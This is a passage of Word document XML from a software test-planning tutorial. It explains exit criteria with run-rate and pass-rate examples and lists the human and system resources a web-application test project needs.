          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="554CC2EA" wp14:editId="7CDE728E">
                  <wp:extent cx="2922043" cy="248066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921838" cy="2480493"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln w="9525">
                            <a:noFill/>
                            <a:miter lim="800000"/>
                            <a:headEnd/>
                            <a:tailEnd/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w: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Exit Criteria</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It specifies the criteria that denote a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>successful</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> completion of a test phase. The exit criteria are the targeted results of the test and are necessary before proceeding to the next phase of development. Example: </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>95%</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> of all critical test cases must pass.</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Some methods of defining exit criteria are by specifying a targeted </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>run rate</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pass rate</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="5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Run rate is ratio between </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>number test cases executed/total test cases</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> of test specification. For example, the test specification has total 120 TCs, but the tester only executed 100 TCs, </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>So</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> the run rate is 100/120 = 0.83 (83%)</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">
            <w:pPr>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="5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Pass rate is ratio between </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>numbers test cases passed / test cases executed</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>. For example, in above 100 TCs executed, there’re 80 TCs that passed, so the pass rate is 80/100 = 0.8 (80%)</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data can be retrieved in Test Metric documents.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Run</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> rate is mandatory to be </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>100% </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>unless a clear reason is given.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00F97FFE">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Pass</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> rate is dependent on project scope, but </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>achieving high pass rate</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> is a goal.</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Example:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Your Team has already done the test executions. They report the test result to you, and they want you to confirm the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Exit Criteria.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>In above case, the Run rate is mandatory is </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>100%, </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">but the test </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>team</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve"> only completed 90% of test cases. It means the Run rate is not satisfied, so do NOT confirm the Exit Criteria </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading4"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="216" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Step 5) Resource Planning</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>Resource plan is a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>detailed summary</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> of all types of resources required to complete project task. Resource could be human, equipment and materials needed to complete a project</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>The resource planning is important factor of the test planning because helps in </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>determining</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> the </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rStyle w:val="Strong"/>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>number</w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t> of resources (employee, equipment…) to be used for the project. Therefore, the Test Manager can make the correct schedule &amp; estimation for the project.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>This section represents the recommended resources for your project.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="Heading4"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:line="216" w:lineRule="atLeast"/>
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Human Resource</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>The following table represents various members in your project team</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:pStyle w:val="NormalWeb"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:rPr>
                <w:color w:val="343434"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:tbl>
            <w:tblPr>
              <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:vertAnchor="text" w:horzAnchor="margin" w:tblpXSpec="center" w:tblpY="70"/>
              <w:tblW w:w="12896"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46"/>
              <w:gridCol w:w="1710"/>
              <w:gridCol w:w="9840"/>
            </w:tblGrid>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1346"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No.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1710"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Member</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="9840"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Tasks</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">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1.     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Manager</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Manage</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> the whole project</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Define project </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>directions</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Acquire appropriate resources</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="134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lastRenderedPageBreak/>
                    <w:t>2.     </w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="171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Tester</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="984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Identifying and describing appropriate test techniques/tools/automation architecture</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Verify and assess the Test Approach</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Execute</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> the tests, </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>Log</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> results, </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>Report</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> the defects.</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 xml:space="preserve">Tester could be in-sourced or out-sourced members, </w:t>
                  </w:r>
                  <w:proofErr w:type="spellStart"/>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>base</w:t>
                  </w:r>
                  <w:proofErr w:type="spellEnd"/>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t xml:space="preserve"> on the project budget</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For the task which required </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>low</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> skill, I recommend you choose </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>outsourced</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> members to </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>save</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t> project cost.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">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3.     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Developer in Test</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proofErr w:type="spellStart"/>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>Implement</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>the</w:t>
                  </w:r>
                  <w:proofErr w:type="spellEnd"/>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t xml:space="preserve"> test cases, test program, test suite etc.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="134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4.     </w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="171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Administrator</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="984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Builds up and ensures test environment and assets are </w:t>
                  </w:r>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>managed</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maintained</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proofErr w:type="spellStart"/>
                  <w:r w:rsidRPr="00E97930">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:b/>
                      <w:bCs/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>Support</w:t>
                  </w:r>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t>Tester</w:t>
                  </w:r>
                  <w:proofErr w:type="spellEnd"/>
                  <w:r w:rsidRPr="00B86CAC">
                    <w:rPr>
                      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                      <w:color w:val="343434"/>
                    </w:rPr>
                    <w:t xml:space="preserve"> to use the test environment for test execution</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">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5.     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SQA members</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Take in charge of quality assurance</w:t>
                  </w:r>
                </w:p>
                <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">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to confirm whether the testing process is meeting specified requirements</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
          </w:tbl>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00E97930" w:rsidRDefault="00EC39D9" w:rsidP="00EC39D9">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC"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System Resource</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00EC39D9" w:rsidRPr="00B86CAC"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For testing, a web application, you should plan the resources as following tables:</w:t>
            </w:r>
          </w:p>
          <w:tbl>
            <w:tblPr>
              <w:tblW w:w="12896"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3"/>
              <w:gridCol w:w="1126"/>
              <w:gridCol w:w="10297"/>
            </w:tblGrid>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1476"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No.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1093"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Resources</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="10327"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Descriptions</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="147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1.     </w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1093"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Server</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1032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Install the web application under test</w:t>
                  </w:r>
                </w:p>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includes a separate web server, database server, and application server if applicable</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="147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2.     </w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1093"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tool</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1032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testing tool is to automate the testing, simulate the user operation, generate the test results</w:t>
                  </w:r>
                </w:p>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There are tons of test tools you can use for this project such as Selenium, QTP…etc.</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="00EC39D9" w:rsidRPr="00B86CAC" w:rsidTr="00BC3F7A">
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="147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3.     </w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1093"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Network</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
